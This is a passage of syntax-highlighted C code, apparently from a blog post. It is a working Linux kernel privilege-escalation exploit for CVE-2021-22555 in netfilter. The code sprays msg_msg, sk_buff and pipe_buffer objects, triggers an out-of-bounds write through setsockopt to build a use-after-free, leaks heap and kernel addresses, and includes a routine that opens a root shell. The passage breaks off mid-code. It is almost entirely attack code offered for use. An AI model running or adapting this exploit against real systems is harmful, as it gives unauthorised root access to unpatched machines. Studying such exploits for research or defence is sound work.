class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> socket_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span></span><br><span class="line">        <span class="type">char</span> pad[<span class="number">0x108</span> + PRIMARY_MSG_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span></span><br><span class="line">    &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">    data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">    data.replace.size = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    </span><br><span class="line">    data.entry.next_offset = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    data.entry.target_offset = </span><br><span class="line">            <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    </span><br><span class="line">    data.match.u.user.match_size = <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">    data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">    data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// partial overwrite the next object</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)))</span><br><span class="line">        <span class="keyword">if</span> (errno == ENOPROTOOPT)</span><br><span class="line">            errExit(<span class="string">&quot;ip_tables module is not loaded!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         socket_fd;</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ident namespace</span></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create socket!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(socket_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 